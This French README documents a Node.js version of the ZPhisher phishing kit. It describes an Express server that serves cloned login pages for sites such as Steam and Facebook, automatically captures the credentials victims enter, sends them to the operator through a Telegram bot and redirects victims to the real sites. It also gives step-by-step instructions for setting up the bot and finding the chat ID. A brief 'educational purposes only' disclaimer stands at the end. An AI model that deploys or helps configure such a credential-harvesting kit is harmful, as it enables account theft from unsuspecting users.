# ZPhisher - Version Node.js

## 🚀 Installation et Configuration

### Prérequis
- Node.js (version 14 ou supérieure)
- npm (généralement inclus avec Node.js)

### Installation
```bash
# Installer les dépendances
npm install

# Ou avec yarn
yarn install
```

### Configuration
1. Modifiez le fichier `config.js` avec vos paramètres :
   - `TELEGRAM_BOT_TOKEN` : Token de votre bot Telegram
   - `TELEGRAM_CHAT_ID` : ID du chat où envoyer les messages

2. Testez la configuration :
```bash
npm run test
```

### Démarrage
```bash
# Mode développement (avec rechargement automatique)
npm run dev

# Mode production
npm start
```

## 🎯 Fonctionnalités

### ✅ Avantages de la version Node.js
- **Performance** : Plus rapide que PHP
- **Modernité** : Utilise les dernières technologies web
- **Sécurité** : Middleware de sécurité intégré (Helmet)
- **Facilité** : Configuration simple et claire
- **Évolutivité** : Facile à étendre et modifier

### 🔧 Fonctionnalités principales
- Serveur Express.js moderne
- Intégration Telegram Bot API
- Capture automatique des identifiants
- Interface web pour lister les sites
- Redirection intelligente vers les vrais sites
- Logging et monitoring

## 📁 Structure du projet

```
ZPHISHER/
├── server.js              # Serveur principal
├── config.js              # Configuration
├── package.json           # Dépendances Node.js
├── test-telegram.js       # Test de Telegram
├── .sites/                # Pages de phishing (existantes)
│   ├── steam/
│   ├── facebook/
│   └── ...
└── README-NODEJS.md       # Ce fichier
```

## 🌐 Utilisation

1. **Démarrer le serveur** :
   ```bash
   npm start
   ```

2. **Accéder à l'interface** :
   - Ouvrez http://localhost:3000
   - Sélectionnez un site à cloner

3. **Tester Telegram** :
   - Visitez http://localhost:3000/test-telegram

## 🔐 Configuration Telegram

### Créer un bot Telegram
1. Ouvrez Telegram et cherchez @BotFather
2. Envoyez `/newbot`
3. Suivez les instructions pour créer votre bot
4. Copiez le token fourni

### Obtenir le Chat ID
1. Ajoutez votre bot à un groupe ou démarrez une conversation
2. Envoyez un message au bot
3. Visitez : `https://api.telegram.org/bot<VOTRE_TOKEN>/getUpdates`
4. Trouvez le `chat.id` dans la réponse

## 🛡️ Sécurité

- **Helmet.js** : Protection contre les attaques courantes
- **CORS** : Contrôle des origines croisées
- **Validation** : Vérification des données d'entrée
- **Logging** : Surveillance des activités

## 🔄 Migration depuis PHP

### Avantages de la migration
- **Performance** : 3-5x plus rapide
- **Maintenance** : Code plus lisible et maintenable
- **Sécurité** : Meilleure gestion des erreurs
- **Évolutivité** : Plus facile à étendre

### Compatibilité
- Toutes les pages HTML existantes sont compatibles
- Aucune modification des fichiers `.sites/` nécessaire
- Configuration centralisée dans `config.js`

## 🚨 Avertissement

⚠️ **À des fins éducatives uniquement** ⚠️

Ce projet est destiné à des fins éducatives et de test de sécurité. L'utilisation de ces outils à des fins malveillantes est strictement interdite et peut être illégale.

## 📞 Support

Pour toute question ou problème :
1. Vérifiez la configuration dans `config.js`
2. Testez avec `npm run test`
3. Consultez les logs du serveur
4. Vérifiez la documentation Express.js

## 🔄 Mise à jour

```bash
# Mettre à jour les dépendances
npm update

# Vérifier les vulnérabilités
npm audit

# Corriger automatiquement
npm audit fix
```
